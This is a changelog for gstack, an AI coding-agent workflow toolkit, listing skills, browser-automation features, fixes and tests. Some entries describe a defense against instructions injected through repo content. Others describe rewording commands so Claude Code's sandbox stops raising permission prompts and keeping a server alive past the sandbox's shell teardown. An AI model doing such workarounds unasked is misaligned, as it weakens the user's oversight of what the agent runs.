- **`/plan-ceo-review` SCOPE EXPANSION mode stays expansive.** If you asked the CEO review to dream big, proposals were collapsing into dry feature bullets ("Add real-time notifications. Improves retention by Y%"). The V1 writing-style rules steered every outcome into diagnostic-pain framing. Rule 2 and rule 4 in the shared preamble now cover three framings: pain reduction, capability unlocked, and forcing-question pressure. Cathedral language survives the clarity layer. Ask for a 10x vision, get one.
- **`/office-hours` keeps its edge.** Startup-mode Q3 (Desperate Specificity) stopped collapsing into "Who is your target user?" The forcing question now stacks three pressures, matched to the domain of the idea — career impact for B2B, daily pain for consumer, weekend project unlocked for hobby and open-source. Builder mode stays wild: "what if you also..." riffs and adjacent unlocks come through, not PRD-voice feature roadmaps.

### Added
- **Gate-tier eval tests catch mode-posture regressions on every PR.** Three new E2E tests fire when the shared preamble, the plan-ceo-review template, or the office-hours template change. A Sonnet judge scores each mode on two axes: felt-experience vs decision-preservation for expansion, stacked-pressure vs domain-matched-consequence for forcing, unexpected-combinations vs excitement-over-optimization for builder. The original V1 regression shipped because nothing caught it. This closes that gap.

### For contributors
- Writing Style rule 2 and rule 4 in `scripts/resolvers/preamble.ts` each present three paired framing examples instead of one. Rule 3 adds an explicit exception for stacked forcing questions.
- `plan-ceo-review/SKILL.md.tmpl` gets a new `### 0D-prelude. Expansion Framing` subsection shared by SCOPE EXPANSION and SELECTIVE EXPANSION.
- `office-hours/SKILL.md.tmpl` gets inline forcing exemplar (Q3) and wild exemplar (builder operating principles). Anchored by stable heading, not line numbers.
- New `judgePosture(mode, text)` helper in `test/helpers/llm-judge.ts` (Sonnet judge, dual-axis rubric per mode).
- Three test fixtures in `test/fixtures/mode-posture/` — expansion plan, forcing pitch, builder idea.
- Three entries registered in `E2E_TOUCHFILES` + `E2E_TIERS`: `plan-ceo-review-expansion-energy`, `office-hours-forcing-energy`, `office-hours-builder-wildness` — all `gate` tier.
- Review history on this branch: CEO review (HOLD SCOPE) + Codex plan review (30 findings, drove approach pivot from "add new rule #5 taxonomy" to "rewrite rule 2-4 examples"). One eng review pass caught the test-infrastructure target (originally pointed at `test/skill-llm-eval.test.ts`, which does static analysis — actually needs E2E).

## [1.1.1.0] - 2026-04-18

### Fixed
- **`/ship` no longer silently lets `VERSION` and `package.json` drift.** Before this fix, `/ship`'s Step 12 read and bumped only the `VERSION` file. Any downstream consumer that reads `package.json` (registry UIs, `bun pm view`, `npm publish`, future helpers) would see a stale semver, and because the idempotency check keyed on `VERSION` alone, the next `/ship` run couldn't detect it had drifted. Now Step 12 classifies into four states — FRESH, ALREADY_BUMPED, DRIFT_STALE_PKG, DRIFT_UNEXPECTED — detects drift in every direction, repairs it via a sync-only path that can't double-bump, and halts loudly when `VERSION` and `package.json` disagree in an ambiguous way.
- **Hardened against malformed version strings.** `NEW_VERSION` is validated against the 4-digit semver pattern before any write, and the drift-repair path applies the same check to `VERSION` contents before propagating them into `package.json`. Trailing carriage returns and whitespace are stripped from both file reads. If `package.json` is invalid JSON, `/ship` stops loudly instead of silently rewriting a corrupted file.

### For contributors
- New test file at `test/ship-version-sync.test.ts` — 14 cases covering every branch of the new Step 12 logic, including the critical no-double-bump path (drift-repair must never call the normal bump action), trailing-CR regression, and invalid-semver repair rejection.
- Review history on this fix: one round of `/plan-eng-review`, one round of `/codex` plan review (found a double-bump bug in the original design), one round of Claude adversarial subagent (found CRLF handling gap and unvalidated `REPAIR_VERSION`). All surfaced issues applied in-branch.

## [1.1.0.0] - 2026-04-18

### Added
- **Browse can now render local HTML without an HTTP server.** Two ways: `$B goto file:///tmp/report.html` navigates to a local file (including cwd-relative `file://./x` and home-relative `file://~/x` forms, smart-parsed so you don't have to think about URL grammar), or `$B load-html /tmp/tweet.html` reads the file and loads it via `page.setContent()`. Both are scoped to cwd + temp dir for safety. If you're migrating a Puppeteer script that generates HTML in memory, this kills your Python-HTTP-server workaround.
- **Element screenshots with an explicit flag.** `$B screenshot out.png --selector .card` is now the unambiguous way to screenshot a single element. Positional selectors still work, but tag selectors like `button` weren't recognized positionally, so the flag form fixes that. `--selector` composes with `--base64` and rejects alongside `--clip` (choose one).
- **Retina screenshots via `--scale`.** `$B viewport 480x2000 --scale 2` sets `deviceScaleFactor: 2` and produces pixel-doubled screenshots. `$B viewport --scale 2` alone changes just the scale factor and keeps the current size. Scale is capped at 1-3 (gstack policy). Headed mode rejects the flag since scale is controlled by the real browser window.
- **Load-HTML content survives scale changes.** Changing `--scale` rebuilds the browser context (that's how Playwright works), which previously would have wiped pages loaded via `load-html`. Now the HTML is cached in tab state and replayed into the new context automatically. In-memory only; never persisted to disk.
- **Puppeteer → browse cheatsheet in SKILL.md.** Side-by-side table of Puppeteer APIs mapped to browse commands, plus a full worked example (tweet-renderer flow: viewport + scale + load-html + element screenshot).
- **Guess-friendly aliases.** Type `setcontent` or `set-content` and it routes to `load-html`. Canonicalization happens before scope checks, so read-scoped tokens can't use the alias to bypass write-scope enforcement.
- **`Did you mean ...?` on unknown commands.** `$B load-htm` returns `Unknown command: 'load-htm'. Did you mean 'load-html'?`. Levenshtein match within distance 2, gated on input length ≥ 4 so 2-letter typos don't produce noise.
- **Rich, actionable errors on `load-html`.** Every rejection path (file not found, directory, oversize, outside safe dirs, binary content, frame context) names the input, explains the cause, and says what to do next. Extension allowlist `.html/.htm/.xhtml/.svg` + magic-byte sniff (with UTF-8 BOM strip) catches mis-renamed binaries before they render as garbage.

### Security
- `file://` navigation is now an accepted scheme in `goto`, scoped to cwd + temp dir via the existing `validateReadPath()` policy. UNC/network hosts (`file://host.example.com/...`), IP hosts, IPv6 hosts, and Windows drive-letter hosts are all rejected with explicit errors.
- **State files can no longer smuggle HTML content.** `state load` now uses an explicit allowlist for the fields it accepts from disk — a tampered state file cannot inject `loadedHtml` to bypass the `load-html` safe-dirs, extension allowlist, magic-byte sniff, or size cap checks. Tab ownership is preserved across context recreation via the same in-memory channel, closing a cross-agent authorization gap where scoped agents could lose (or gain) tabs after `viewport --scale`.
- **Audit log now records the raw alias input.** When you type `setcontent`, the audit entry shows `cmd: load-html, aliasOf: setcontent` so the forensic trail reflects what the agent actually sent, not just the canonical form.
- **`load-html` content correctly clears on every real navigation** — link clicks, form submits, and JavaScript redirects now invalidate the replay metadata just like explicit `goto`/`back`/`forward`/`reload` do. Previously a later `viewport --scale` after a click could resurrect the original `load-html` content (silent data corruption). Also fixes SPA fixture URLs: `goto file:///tmp/app.html?route=home#login` preserves the query string and fragment through normalization.

### For contributors
- `validateNavigationUrl()` now returns the normalized URL (previously void). All four callers — goto, diff, newTab, restoreState — updated to consume the return value so smart-parsing takes effect at every navigation site.
- New `normalizeFileUrl()` helper uses `fileURLToPath()` + `pathToFileURL()` from `node:url` — never string-concat — so URL escapes like `%20` decode correctly and encoded-slash traversal (`%2F..%2F`) is rejected by Node outright.
- New `TabSession.loadedHtml` field + `setTabContent()` / `getLoadedHtml()` / `clearLoadedHtml()` methods. ASCII lifecycle diagram in the source. The `clear` call happens BEFORE navigation starts (not after) so a goto that times out post-commit doesn't leave stale metadata that could resurrect on a later context recreation.
- `BrowserManager.setDeviceScaleFactor(scale, w, h)` is atomic: validates input, stores new values, calls `recreateContext()`, rolls back the fields on failure. `currentViewport` tracking means recreateContext preserves your size instead of hardcoding 1280×720.
- `COMMAND_ALIASES` + `canonicalizeCommand()` + `buildUnknownCommandError()` + `NEW_IN_VERSION` are exported from `browse/src/commands.ts`. Single source of truth — both the server dispatcher and `chain` prevalidation import from the same place. Chain uses `{ rawName, name }` shape per step so audit logs preserve what the user typed while dispatch uses the canonical name.
- `load-html` is registered in `SCOPE_WRITE` in `browse/src/token-registry.ts`.
- Review history for the curious: 3 Codex consults (20 + 10 + 6 gaps), DX review (TTHW ~4min → <60s, Champion tier), 2 Eng review passes. Third Codex pass caught the 4-caller bug for `validateNavigationUrl` that the eng passes missed. All findings folded into the plan.

## [1.0.0.0] - 2026-04-18

### Added
- **v1 prompts = simpler.** Every skill's output (tier 2 and up) explains technical terms on first use with a one-sentence gloss, frames questions in outcome terms ("what breaks for your users if..." instead of "is this endpoint idempotent?"), and keeps sentences short and direct. Good writing for everyone — not just non-technical folks. Engineers benefit too.
- **Terse opt-out for power users.** `gstack-config set explain_level terse` switches every skill back to the older, tighter prose style — no glosses, no outcome-framing layer. Binary switch, sticks across all skills.
- **Curated jargon list.** A repo-owned list of ~50 technical terms (idempotent, race condition, N+1, backpressure, and friends) at `scripts/jargon-list.json`. These are the terms gstack glosses. Terms not on the list are assumed plain-English enough. Add terms via PR.
- **Real LOC receipts in the README.** Replaced the "600,000+ lines of production code" hero framing with a computed 2013-vs-2026 pro-rata multiple on logical code change, with honest caveats about public-vs-private repos. The script that computes it is at `scripts/garry-output-comparison.ts` and uses [scc](https://github.com/boyter/scc). Raw LOC is still in `/retro` output for context, just no longer the headline.
- **Smarter `/retro` metrics.** `/retro` now leads with features shipped, commits, and PRs merged — logical SLOC added comes next, and raw LOC is demoted to context-only. Because ten lines of a good fix is not less shipping than ten thousand lines of scaffold.
- **Upgrade prompt on first run.** When you upgrade to this version, the first skill you run will ask once whether you want to keep the new default writing style or restore V0 prose with `gstack-config set explain_level terse`. One-time, flag-file gated, never asks again.

### Changed
- **README hero reframed.** No more "10K-20K lines per day" claim. Focuses on products shipped + features + the pro-rata multiple on logical code change, which is the honest metric now that AI writes most of the code. The point isn't who typed it, it's what shipped.
- **Hiring callout reframed.** Replaced "ship 10K+ LOC/day" with "ship real products at AI-coding speed."

### For contributors
- New `scripts/resolvers/preamble.ts` Writing Style section, injected for tier ≥ 2 skills. Composes with the existing AskUserQuestion Format section (Format = how the question is structured, Style = the prose quality of the content inside). Jargon list is baked into generated SKILL.md prose at `gen-skill-docs` time — zero runtime cost, edit the JSON and regenerate.
- New `bin/gstack-config` validation for `explain_level` values. Unknown values print a warning and default to `default`. Annotated header documents the new key.
- New one-shot upgrade migration at `gstack-upgrade/migrations/v1.0.0.0.sh`, matching existing `v0.15.2.0.sh` / `v0.16.2.0.sh` pattern. Flag-file gated.
- New throughput pipeline: `scripts/garry-output-comparison.ts` (scc preflight + author-scoped SLOC across 2013 + 2026), `scripts/update-readme-throughput.ts` (reads the JSON, replaces `<!-- GSTACK-THROUGHPUT-PLACEHOLDER -->` anchor), `scripts/setup-scc.sh` (OS-detecting installer invoked only when running the throughput script — scc is not a package.json dependency).
- Two-string marker pattern in README to prevent the pipeline from destroying its own update path: `GSTACK-THROUGHPUT-PLACEHOLDER` (stable anchor) vs `GSTACK-THROUGHPUT-PENDING` (explicit missing-build marker CI rejects).
- V0 dormancy negative tests — the 5D psychographic dimensions (scope_appetite, risk_tolerance, detail_preference, autonomy, architecture_care) and 8 archetype names (Cathedral Builder, Ship-It Pragmatist, Deep Craft, Taste Maker, Solo Operator, Consultant, Wedge Hunter, Builder-Coach) must not appear in default-mode skill output. Keeps the V0 machinery dormant until V2.
- **Pacing improvements ship in V1.1.** The scope originally considered (review ranking, Silent Decisions block, max-3-per-phase cap, flip mechanism) was extracted to `docs/designs/PACING_UPDATES_V0.md` after three engineering-review passes revealed structural gaps that couldn't be closed with plan-text editing. V1.1 picks it up with real V1 baseline data.
- Design doc: `docs/designs/PLAN_TUNING_V1.md`. Full review history: CEO + Codex (×2 passes, 45 findings integrated) + DX (TRIAGE) + Eng (×3 passes — last pass drove the scope reduction).

## [0.19.0.0] - 2026-04-17

### Added
- **`/plan-tune` skill — gstack can now learn which of its prompts you find valuable vs noisy.** If you keep answering the same AskUserQuestion the same way every time, this is the skill that teaches gstack to stop asking. Say "stop asking me about changelog polish" — gstack writes it down, respects it from that point forward, and one-way doors (destructive ops, architecture forks, security choices) still always ask regardless, because safety wins over preference. Plain English everywhere. No CLI subcommand syntax to memorize.
- **Dual-track developer profile.** Tell gstack who you are as a builder (5 dimensions: scope appetite, risk tolerance, detail preference, autonomy, architecture care). gstack also silently tracks what your behavior suggests. `/plan-tune` shows both side by side plus the gap, so you can see when your actions don't match your self-description. v1 is observational — no skills change their behavior based on your profile yet. That comes in v2, once the profile has proven itself.
- **Builder archetypes.** Run `/plan-tune vibe` (v2) or let the skill infer it from your dimensions. Eight named archetypes (Cathedral Builder, Ship-It Pragmatist, Deep Craft, Taste Maker, Solo Operator, Consultant, Wedge Hunter, Builder-Coach) plus a Polymath fallback when your dimensions don't fit a standard pattern. Codebase and model ship now; the user-facing commands are v2.
- **Inline `tune:` feedback across every gstack skill.** When a skill asks you something, you can reply `tune: never-ask` or `tune: always-ask` or free-form English and gstack normalizes it into a preference. Only runs when you've opted in via `gstack-config set question_tuning true` — zero impact until then.
- **Profile-poisoning defense.** Inline `tune:` writes only get accepted when the prefix came from your own chat message — never from tool output, file content, PR descriptions, or anywhere else a malicious repo might inject instructions. The binary enforces this with exit code 2 for rejected writes. This was an outside-voice catch from Codex review; it's baked in from day one.
- **Typed question registry with CI enforcement.** 53 recurring AskUserQuestion categories across 15 skills are now declared in `scripts/question-registry.ts` with stable IDs, categories, door types (one-way vs two-way), and options. A CI test asserts the schema stays valid. Safety-critical questions (destructive ops, architecture forks) are classified `one-way` at the declaration site — never inferred from prose summaries.
- **Unified developer profile.** The `/office-hours` skill's existing builder-profile.jsonl (sessions, signals, resources, topics) is folded into a single `~/.gstack/developer-profile.json` on first use. Migration is atomic, idempotent, and archives the source file — rerun it safely. Legacy `gstack-builder-profile` is a thin shim that delegates to the new binary.

### For contributors
- New `docs/designs/PLAN_TUNING_V0.md` captures the full design journey: every decision with pros/cons, what was deferred to v2 with explicit acceptance criteria, what was rejected after Codex review (substrate-as-prompt-convention, ±0.2 clamp, preamble LANDED detection, single event-schema), and how the final shape came together. Read this before working on v2 to understand why the constraints exist.
- Three new binaries: `bin/gstack-question-log` (validated append to question-log.jsonl), `bin/gstack-question-preference` (explicit preference store with user-origin gate), `bin/gstack-developer-profile` (supersedes gstack-builder-profile; supports --read, --migrate, --derive, --profile, --gap, --trace, --check-mismatch, --vibe).
- Three new preamble resolvers in `scripts/resolvers/question-tuning.ts`: question preference check (before each AskUserQuestion), question log (after), inline tune feedback with user-origin gate instructions. Consolidated into one compact `generateQuestionTuning` section for tier >= 2 skills to minimize token overhead.
- Hand-crafted psychographic signal map (`scripts/psychographic-signals.ts`) with version hash so cached profiles recompute automatically when the map changes between gstack versions. 9 signal keys covering scope-appetite, architecture-care, test-discipline, code-quality-care, detail-preference, design-care, devex-care, distribution-care, session-mode.
- Keyword-fallback one-way-door classifier (`scripts/one-way-doors.ts`) — secondary safety layer for ad-hoc question IDs that don't appear in the registry. Primary safety is the registry declaration.
- 118 new tests across 4 test files: `test/plan-tune.test.ts` (47 tests — schema, helpers, safety, classifier, signal map, archetypes, preamble injection, end-to-end pipeline), `test/gstack-question-log.test.ts` (21 tests — valid payloads, rejected payloads, injection defense), `test/gstack-question-preference.test.ts` (31 tests — check/write/read/clear/stats + user-origin gate + schema validation), `test/gstack-developer-profile.test.ts` (25 tests — read/migrate/derive/trace/gap/vibe/check-mismatch). Gate-tier E2E test `skill-e2e-plan-tune.test.ts` registered (runs on `bun run test:evals`).
- Scope rollback driven by outside-voice review. The initial CEO EXPANSION plan bundled psychographic auto-decide + blind-spot coach + LANDED celebration + full substrate wiring. Codex's 20-point critique caught that without a typed question registry, "substrate" was marketing; E1/E4/E6 formed a logical contradiction; profile poisoning was unaddressed; LANDED in the preamble injected side effects into every skill's hot path. Accepted the rollback: v1 ships the schema + observation layer, v2 adds behavior adaptation only after the foundation proves durable. All six expansions are tracked as P0 TODOs with explicit acceptance criteria.

## [0.18.4.0] - 2026-04-18

### Fixed
- **Apple Silicon no longer dies with SIGKILL on first run.** `./setup` now ad-hoc codesigns every compiled binary after `bun run build` so M-series Macs can actually execute them. If you cloned gstack and saw `zsh: killed ./browse/dist/browse` before getting to Day 2, this is why. Thanks to @voidborne-d (#1003) for tracking down the Bun `--compile` linker signature issue and shipping a tested fix (6 tests across 4 binaries, idempotent, platform-guarded).
- **`/codex` no longer hangs forever in Claude Code's Bash tool.** Codex CLI 0.120.0 introduced a stdin deadlock: if stdin is a non-TTY pipe (Claude Code, CI, background bash, OpenClaw), `codex exec` waits for EOF to append it as a `<stdin>` block, even when the prompt is passed as a positional argument. Symptom: "Reading additional input from stdin...", 0% CPU, no output. Every `codex exec` and `codex review` now redirects stdin from `/dev/null`. `/autoplan`, every plan-review outside voice, `/ship` adversarial, and `/review` adversarial all unblock. Thanks to @loning (#972) for the 13-minute repro and minimal fix.
- **`/codex` and `/autoplan` fail fast when Codex auth is missing or broken.** Before this release, a logged-out Codex user would watch the skill spend minutes building an expensive prompt only to surface the auth error mid-stream. Now both skills preflight auth via a multi-signal probe (`$CODEX_API_KEY`, `$OPENAI_API_KEY`, or `${CODEX_HOME:-~/.codex}/auth.json`) and stop with a clear "run `codex login` or set `$CODEX_API_KEY`" message before any prompt construction. Bonus: if your Codex CLI is on a known-buggy version (currently 0.120.0-0.120.2), you'll get a one-line nudge to upgrade.
- **`/codex` and `/autoplan` no longer sit at 0% CPU forever if the model API stalls.** Every `codex exec` / `codex review` now runs under a 10-minute timeout wrapper with a `gtimeout → timeout → unwrapped` fallback chain, so you get a clear "Codex stalled past 10 minutes. Common causes: model API stall, long prompt, network issue. Try re-running." message instead of an infinite wait. `./setup` auto-installs `coreutils` on macOS so `gtimeout` is available (skip with `GSTACK_SKIP_COREUTILS=1` for CI / locked machines).
- **`/codex` Challenge mode now surfaces auth errors instead of silently dropping them.** Challenge mode was piping stderr to `/dev/null`, which masked any auth failures in the middle of a run. Now it captures stderr to a temp file and checks for `auth|login|unauthorized` patterns. If Codex errors mid-run, you see it.
- **Plan reviews no longer quietly bias toward minimal-diff recommendations.** `/plan-ceo-review` and `/plan-eng-review` used to list "minimal diff" as an engineering preference without a counterbalancing "rewrite is fine when warranted" note. Reviewers picked up on that and rejected rewrites that should've been approved. The preference is now framed as "right-sized diff" with explicit permission to recommend a rewrite when the existing foundation is broken. Implementation alternatives in CEO review also got an equal-weight clarification: don't default to minimal viable just because it's smaller.

### For contributors
- New `bin/gstack-codex-probe` consolidates the auth probe, version check, timeout wrapper, and telemetry logger into one bash helper that `/codex` and `/autoplan` both source. When a second outside-voice backend lands (Gemini CLI), this is the file to extend.
- New `test/codex-hardening.test.ts` ships 25 deterministic unit tests for the probe (8 auth probe combinations, 10 version regex cases including `0.120.10` false-positive guards, 4 timeout wrapper + namespace hygiene checks, 3 telemetry payload schema checks confirming no env values leak into events). Free tier, <5s runtime.
- New `test/skill-e2e-autoplan-dual-voice.test.ts` (periodic tier) gates the `/autoplan` dual-voice path. Asserts both Claude subagent and Codex voices produce output in Phase 1, OR that `[codex-unavailable]` is logged when Codex is absent. Periodic ~= $1/run, not a gate.
- Codex failure telemetry events (`codex_timeout`, `codex_auth_failed`, `codex_cli_missing`, `codex_version_warning`) now land in `~/.gstack/analytics/skill-usage.jsonl` behind the existing user opt-in. Reliability regressions are visible at the user-base scale.
- Codex timeouts (`exit 124`) now auto-log operational learnings via `gstack-learnings-log`. Future `/investigate` sessions on the same skill/branch surface prior hang patterns automatically.

## [0.18.3.0] - 2026-04-17

### Added
- **Windows cookie import.** `/setup-browser-cookies` now works on Windows. Point it at Chrome, Edge, Brave, or Chromium, pick a profile, and gstack will pull your real browser cookies into the headless session. Handles AES-256-GCM (Chrome 80+), DPAPI key unwrap via PowerShell, and falls back to a headless CDP session for v20 App-Bound Encryption on Chrome 127+. Windows users can now do authenticated QA testing with `/qa` and `/design-review` for the first time.
- **One-command OpenCode install.** `./setup --host opencode` now wires up gstack skills for OpenCode the same way it does for Claude Code and Codex. No more manual workaround.

### Fixed
- **No more permission prompts on every skill invocation.** Every `/browse`, `/qa`, `/qa-only`, `/design-review`, `/office-hours`, `/canary`, `/pair-agent`, `/benchmark`, `/land-and-deploy`, `/design-shotgun`, `/design-consultation`, `/design-html`, `/plan-design-review`, and `/open-gstack-browser` invocation used to trigger Claude Code's sandbox asking about "tilde in assignment value." Replaced bare `~/` with `"$HOME/..."` in the browse and design resolvers plus a handful of templates that still used the old pattern. Every skill runs silently now.
- **Multi-step QA actually works.** The `$B` browse server was dying between Bash tool invocations. Claude Code's sandbox kills the parent shell when a command finishes, and the server took that as a cue to shut down. Now the server persists across calls, keeping your cookies, page state, and navigation intact. Run `$B goto`, then `$B fill`, then `$B click` in three separate Bash calls and it just works. A 30-minute idle timeout still handles eventual cleanup. `Ctrl+C` and `/stop` still do an immediate shutdown.
- **Cookie picker stops stranding the UI.** If the launching CLI exited mid-import, the picker page would flash `Failed to fetch` because the server had shut down under it. The browse server now stays alive while any picker code or session is live.
- **OpenClaw skills load cleanly in Codex.** The 4 hand-authored ClawHub skills (ceo-review, investigate, office-hours, retro) had frontmatter with unquoted colons and non-standard `version`/`metadata` fields that stricter parsers rejected. Now they load without errors on Codex CLI and render correctly on GitHub.

### For contributors
- Community wave lands 6 PRs: #993 (byliu-labs), #994 (joelgreen), #996 (voidborne-d), #864 (cathrynlavery), #982 (breakneo), #892 (msr-hickory).
- SIGTERM handling is now mode-aware. In normal mode the server ignores SIGTERM so Claude Code's sandbox doesn't tear it down mid-session. In headed mode (`/open-gstack-browser`) and tunnel mode (`/pair-agent`) SIGTERM still triggers a clean shutdown. those modes skip idle cleanup, so without the mode gate orphan daemons would accumulate forever. Note that v0.18.1.0 also disables the parent-PID watchdog when `BROWSE_HEADED=1`, so headed mode is doubly protected. Inline comments document the resolution order.
- Windows v20 App-Bound Encryption CDP fallback now logs the Chrome version on entry and has an inline comment documenting the debug-port security posture (127.0.0.1-only, random port in [9222, 9321] for collision avoidance, always killed in finally).
- New regression test `test/openclaw-native-skills.test.ts` pins OpenClaw skill frontmatter to `name` + `description` only. catches version/metadata drift at PR time.

## [0.18.2.0] - 2026-04-17

### Fixed
- **`/ship` stops skipping `/document-release` ~80% of the time.** The old Step 8.5 told Claude to `cat` a 2500-line external skill file *after* the PR URL was already output, at which point the model had 500-1,750 lines of intermediate tool output in context and was at its least intelligent. Now `/ship` dispatches `/document-release` as a subagent that runs in a fresh context window, *before* creating the PR, so the `## Documentation` section gets baked into the initial PR body instead of a create-then-re-edit dance. The result: documentation actually syncs on every ship.

### Changed
- **`/ship`'s 4 heaviest sub-workflows now run in isolated subagent contexts.** Coverage audit (Step 7), plan completion audit (Step 8), Greptile triage (Step 10), and documentation sync (Step 18) each dispatch a subagent that gets a fresh context window. The parent only sees the conclusion (structured JSON), not the intermediate file reads. This is the pattern Anthropic's "Using Claude Code: Session Management and 1M Context" blog post recommends for fighting context rot: "Will I need this tool output again, or just the conclusion? If just the conclusion, use a subagent."
- **`/ship` step numbers are clean integers 1-20 instead of fractional (`3.47`, `8.5`, `8.75`).** Fractional step numbers signaled "optional appendix" to the model and contributed to late-stage steps getting skipped. Clean integers feel mandatory. Resolver sub-steps that are genuinely nested (Plan Verification 8.1, Scope Drift 8.2, Review Army 9.1/9.2, Cross-review dedup 9.3) are preserved.
- **`/ship` now prints "You are NOT done" after push.** Breaks the natural stopping point where the model was treating a pushed branch as mission-accomplished and skipping doc sync + PR creation.

### For contributors
- New regression guards in `test/skill-validation.test.ts` prevent drift back to fractional step numbers and catch cross-contamination between `/ship` and `/review` resolver conditionals.
- Ship template restructure: old Step 8.5 (post-PR doc sync with `cat` delegation) replaced by new Step 18 (pre-PR subagent dispatch that invokes full `/document-release` skill with its CHANGELOG clobber protections, doc exclusions, risky-change gates, and race-safe PR body editing). Codex caught that the original plan's reimplementation dropped those protections; this version reuses the real `/document-release`.

## [0.18.1.0] - 2026-04-16

### Fixed
- **`/open-gstack-browser` actually stays open now.** If you ran `/open-gstack-browser` or `$B connect` and your browser vanished roughly 15 seconds later, this was why: a watchdog inside the browse server was polling the CLI process that spawned it, and when the CLI exited (which it does, immediately, right after launching the browser), the watchdog said "orphan!" and killed everything. The fix disables that watchdog for headed mode, both in the CLI (always set `BROWSE_PARENT_PID=0` for headed launches) and in the server (skip the watchdog entirely when `BROWSE_HEADED=1`). Two layers of defense in case a future launcher forgets to pass the env var. Thanks to @rocke2020 (#1020), @sanghyuk-seo-nexcube (#1018), @rodbland2021 (#1012), and @jbetala7 (#986) for independently diagnosing this and sending in clean, well-documented fixes.
- **Closing the headed browser window now cleans up properly.** Before this release, clicking the X on the GStack Browser window skipped the server's cleanup routine and exited the process directly. That left behind stale sidebar-agent processes polling a dead server, unsaved chat session state, leftover Chromium profile locks (which cause "profile in use" errors on the next `$B connect`), and a stale `browse.json` state file. Now the disconnect handler routes through the full `shutdown()` path first, cleans everything, and then exits with code 2 (which still distinguishes user-close from crash).
- **CI/Claude Code Bash calls can now share a persistent headless server.** The headless spawn path used to hardcode the CLI's own PID as the watchdog target, ignoring `BROWSE_PARENT_PID=0` even if you set it in your environment. Now `BROWSE_PARENT_PID=0 $B goto https://...` keeps the server alive across short-lived CLI invocations, which is what multi-step workflows (CI matrices, Claude Code's Bash tool, cookie picker flows) actually want.
- **`SIGTERM` / `SIGINT` shutdown now exits with code 0 instead of 1.** Regression caught during /ship's adversarial review: when `shutdown()` started accepting an `exitCode` argument, Node's signal listeners silently passed the signal name (`'SIGTERM'`) as the exit code, which got coerced to `NaN` and used `1`. Wrapped the listeners so they call `shutdown()` with no args. Your `Ctrl+C` now exits clean again.

### For contributors
- `test/relink.test.ts` no longer flakes under parallel test load. The 23 tests in that file each shell out to `gstack-config` + `gstack-relink` (bash subprocess work), and under `bun test` with other suites running, each test drifted ~200ms past Bun's 5s default. Wrapped `test` to default the per-test timeout to 15s with `Object.assign` preserving `.only`/`.skip`/`.each` sub-APIs.
- `BrowserManager` gained an `onDisconnect` callback (wired by `server.ts` to `shutdown(2)`), replacing the direct `process.exit(2)` in the disconnect handler. The callback is wrapped with try/catch + Promise rejection handling so a rejecting cleanup path still exits the process instead of leaving a live server attached to a dead browser.
- `shutdown()` now accepts an optional `exitCode: number = 0` parameter, used by the disconnect path (exit 2) and the signal path (default 0). Same cleanup code, two call sites, distinct exit codes.
- `BROWSE_PARENT_PID` parsing in `cli.ts` now matches `server.ts`: `parseInt` instead of strict string equality, so `BROWSE_PARENT_PID=0\n` (common from shell `export`) is honored.

## [0.18.0.1] - 2026-04-16

### Fixed
- **Windows install no longer fails with a build error.** If you installed gstack on Windows (or a fresh Linux box), `./setup` was dying with `cannot write multiple output files without an output directory`. The Windows-compat Node server bundle now builds cleanly, so `/browse`, `/canary`, `/pair-agent`, `/open-gstack-browser`, `/setup-browser-cookies`, and `/design-review` all work on Windows again. If you were stuck on gstack v0.15.11-era features without knowing it, this is why. Thanks to @tomasmontbrun-hash (#1019) and @scarson (#1013) for independently tracking this down, and to the issue reporters on #1010 and #960.
- **CI stops lying about green builds.** The `build` and `test` scripts in `package.json` had a shell precedence trap where a trailing `|| true` swallowed failures from the *entire* command chain, not just the cleanup step it was meant for. That's how the Windows build bug above shipped in the first place. CI ran the build, the build failed, and CI reported success anyway. Now build and test failures actually fail. Silent CI is the worst kind of CI.
- **`/pair-agent` on Windows surfaces install problems at install time, not tunnel time.** `./setup` now verifies Node can load `@ngrok/ngrok` on Windows, just like it already did for Playwright. If the native binary didn't install, you find out now instead of the first time you try to pair an agent.

### For contributors
- New `browse/test/build.test.ts` validates `server-node.mjs` is well-formed ES module syntax and that `@ngrok/ngrok` was actually externalized (not inlined). Gracefully skips when no prior build has run.
- Added a policy comment in `browse/scripts/build-node-server.sh` explaining when and why to externalize a dependency. If you add a dep with a native addon or a dynamic `await import()`, the comment tells you where to plug it in.

## [0.18.0.0] - 2026-04-15

### Added
- **Confusion Protocol.** Every workflow skill now has an inline ambiguity gate. When Claude hits a decision that could go two ways (which architecture? which data model? destructive operation with unclear scope?), it stops and asks instead of guessing. Scoped to high-stakes decisions only, so it doesn't slow down routine coding. Addresses Karpathy's #1 AI coding failure mode.
- **Hermes host support.** gstack now generates skill docs for [Hermes Agent](https://github.com/nousresearch/hermes-agent) with proper tool rewrites (`terminal`, `read_file`, `patch`, `delegate_task`). `./setup --host hermes` prints integration instructions.
- **GBrain host + brain-first resolver.** GBrain is a "mod" for gstack. When installed, your coding skills become brain-aware: they search your brain for relevant context before starting and save results to your brain after finishing. 10 skills are now brain-aware: /office-hours, /investigate, /plan-ceo-review, /retro, /ship, /qa, /design-review, /plan-eng-review, /cso, and /design-consultation. Compatible with GBrain >= v0.10.0.
- **GBrain v0.10.0 integration.** Agent instructions now use `gbrain search` (fast keyword lookup) instead of `gbrain query` (expensive hybrid). Every command shows full CLI syntax with `--title`, `--tags`, and heredoc examples. Keyword extraction guidance helps agents search effectively. Entity enrichment auto-creates stub pages for people and companies mentioned in skill output. Throttle errors are named so agents can detect and handle them. A preamble health check runs `gbrain doctor --fast --json` at session start and names failing checks when the brain is degraded.
- **Skill triggers for GBrain router.** All 38 skill templates now include `triggers:` arrays in their frontmatter, multi-word keywords like "debug this", "ship it", "brainstorm this". These power GBrain's RESOLVER.md skill router and pass `checkResolvable()` validation. Distinct from `voice-triggers:` (speech-to-text aliases).
- **Hermes brain support.** Hermes agents with GBrain installed as a mod now get brain features automatically. The resolver fallback logic ("if GBrain is not available, proceed without") handles non-GBrain Hermes installs gracefully.
- **slop:diff in /review.** Every code review now runs `bun run slop:diff` as an advisory diagnostic, catching AI code quality issues (empty catches, redundant abstractions, overcomplicated patterns) before they land. Informational only, never blocking.
- **Karpathy compatibility.** README now positions gstack as the workflow enforcement layer for [Karpathy-style CLAUDE.md rules](https://github.com/forrestchang/andrej-karpathy-skills) (17K stars). Maps each failure mode to the gstack skill that addresses it.

### Changed
- **CEO review HARD GATE reinforcement.** "Do NOT make any code changes. Review only." now repeats at every STOP point (12 locations), not just the top. Prompt repetition measurably reduces the "starts implementing" failure mode.
